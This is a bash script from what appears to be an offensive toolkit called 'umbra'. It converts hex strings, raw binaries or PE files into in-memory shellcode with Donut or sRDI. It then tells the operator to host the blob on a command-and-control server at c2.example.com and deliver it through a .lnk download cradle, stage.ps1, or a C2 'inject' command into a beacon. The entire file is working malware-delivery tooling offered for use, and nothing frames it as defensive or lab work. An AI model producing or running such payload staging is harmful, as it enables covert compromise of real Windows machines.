#!/usr/bin/env bash
# make_shellcode.sh - one-stop generator for the umbra in-memory payload.
#
# It produces, in dist/:
#   blob.bin  raw position-independent shellcode (what gets executed in memory)
#   blob.hex  the same bytes, hex-encoded in a single line (what stage.ps1 / the
#             C2 `inject` command consume)
#
# It is intentionally MetaSploit-free. You can feed it either:
#   1) a HEX string              -> make_shellcode.sh --from-hex 31c0c3
#   2) a raw shellcode .bin      -> make_shellcode.sh --from-raw my_shellcode.bin
#   3) a PE (.exe/.dll)          -> make_shellcode.sh --from-pe dist/loader.exe
#      (converted with Donut or sRDI - the two common, MSF-free, reflective
#       PE->shellcode converters; see the notes printed if neither is installed)
#
# IMPORTANT: you do NOT need this conversion step if you can run a PE directly in
# memory - delivery/reflect.ps1 is a reflective PE loader, so it maps and runs a
# PE (e.g. loader.exe) with no conversion at all. Use this script when your input
# is already shellcode, or when your delivery path only accepts shellcode
# (stage.ps1 / C2 `inject`).
#
# Run on the Kali attacker box (the Windows host has no xxd; see the README troubleshooting section).
set -euo pipefail

OUTDIR="dist"
MODE=""
INPUT=""
NAME="blob"

usage() {
  sed -n '2,32p' "$0" | sed 's/^# \{0,1\}//'
  cat <<'EOF'

Options:
  --from-hex   <hexstring>   raw shellcode given as a hex string (spaces ok)
  --from-raw   <file>        raw shellcode read from a .bin file
  --from-pe    <file>        PE file to convert with Donut (or sRDI)
  -o, --outdir <dir>         output directory (default: dist)
  -n, --name   <name>        base name for outputs (default: blob)
  -h, --help                 this help
EOF
}

log()  { printf '[*] %s\n' "$*"; }
ok()   { printf '[+] %s\n' "$*"; }
die()  { printf '[-] %s\n' "$*" >&2; exit 1; }

need() { command -v "$1" >/dev/null 2>&1 || die "missing tool: $1 ($2)"; }

# --- arg parsing ---------------------------------------------------------------
while [ $# -gt 0 ]; do
  case "$1" in
    --from-hex) MODE=hex; INPUT="${2:-}"; shift 2 ;;
    --from-raw) MODE=raw; INPUT="${2:-}"; shift 2 ;;
    --from-pe)  MODE=pe;  INPUT="${2:-}"; shift 2 ;;
    -o|--outdir) OUTDIR="${2:-}"; shift 2 ;;
    -n|--name)   NAME="${2:-}"; shift 2 ;;
    -h|--help)   usage; exit 0 ;;
    *) die "unknown argument: $1 (try --help)" ;;
  esac
done

[ -n "$MODE" ] || { usage; exit 2; }

mkdir -p "$OUTDIR"
BIN="$OUTDIR/$NAME.bin"
HEX="$OUTDIR/$NAME.hex"

# --- hex -> bin ----------------------------------------------------------------
hex_to_bin() {
  local hex="$1"
  hex="$(printf '%s' "$hex" | tr -d '[:space:]:' )"
  [ -n "$hex" ] || die "empty hex string"
  [ $(( ${#hex} % 2 )) -eq 0 ] || die "hex string has an odd number of characters"
  if command -v xxd >/dev/null 2>&1; then
    printf '%s' "$hex" | xxd -r -p > "$BIN"
  else
    # pure-bash fallback: emit 0xNN bytes directly
    local i b
    for (( i=0; i<${#hex}; i+=2 )); do
      b=$(( 16#${hex:i:2} ))
      printf "\\$(printf '%03o' "$b")"
    done > "$BIN"
  fi
}

# --- PE -> shellcode -----------------------------------------------------------
pe_to_shellcode() {
  local pe="$1"
  [ -f "$pe" ] || die "PE not found: $pe"

  if command -v donut >/dev/null 2>&1; then
    log "converting PE with Donut: $pe"
    # -a 2 = amd64; -e 3 = exit thread (do not kill the host); -f 1 = raw binary out
    donut -i "$pe" -o "$BIN" -a 2 -e 3 -f 1
    return
  fi

  # sRDI (python) fallback
  local srdi=""
  for c in "$HOME/sRDI/Python/ShellcodeRDI.py" "./sRDI/Python/ShellcodeRDI.py" \
           "/opt/sRDI/Python/ShellcodeRDI.py"; do
    [ -f "$c" ] && { srdi="$c"; break; }
  done
  if [ -n "$srdi" ]; then
    log "converting PE with sRDI: $pe"
    python3 "$srdi" --inputFile "$pe" --outputFile "$BIN"
    return
  fi

  die "no PE->shellcode converter found. Install one of:
    - Donut : https://github.com/TheWover/donut   (build: make; or 'apt install donut')
    - sRDI  : git clone https://github.com/monoxgas/sRDI
              python3 sRDI/Python/ShellcodeRDI.py --inputFile <pe> --outputFile $BIN
  OR skip the conversion entirely and run the PE reflectively in memory with
  delivery/reflect.ps1 (no converter needed)."
}

# --- do the work ---------------------------------------------------------------
case "$MODE" in
  hex)
    log "raw shellcode from hex string"
    hex_to_bin "$INPUT"
    ;;
  raw)
    [ -f "$INPUT" ] || die "raw shellcode file not found: $INPUT"
    log "raw shellcode from file: $INPUT"
    cp "$INPUT" "$BIN"
    ;;
  pe)
    pe_to_shellcode "$INPUT"
    ;;
esac

[ -s "$BIN" ] || die "expected output $BIN is empty"
ok "wrote $BIN ($(wc -c < "$BIN") bytes)"

# --- bin -> hex (single line) --------------------------------------------------
if command -v xxd >/dev/null 2>&1; then
  xxd -p -c 1000000 "$BIN" > "$HEX"
elif command -v hexdump >/dev/null 2>&1; then
  hexdump -v -e '1/1 "%02x"' "$BIN" > "$HEX"
else
  die "need xxd (vim-common) or hexdump to encode the hex blob"
fi

[ -s "$HEX" ] || die "hex output is empty (conversion failed)"
ok "wrote $HEX ($(wc -c < "$HEX") bytes, one line)"

# --- verify round-trip ---------------------------------------------------------
if command -v xxd >/dev/null 2>&1; then
  if xxd -r -p "$HEX" | cmp -s - "$BIN"; then
    ok "round-trip OK (hex decodes back to the exact same bytes)"
  else
    die "round-trip FAILED - the hex does not decode back to the .bin"
  fi
fi

printf '\n'
log "first 64 hex chars: $(head -c 64 "$HEX"); echo"
printf '\n'
ok "done. Publish it (scripts/serve.sh + scripts/cf_tunnel.sh expose dist/ at https://c2.example.com):"
printf '      https://c2.example.com/%s.hex\n' "$NAME"
printf '    stage.ps1  -> the .lnk cradle passes -Url https://c2.example.com/%s.hex\n' "$NAME"
printf '    C2 console -> inject <beacon-id> %s\n' "$NAME.hex"
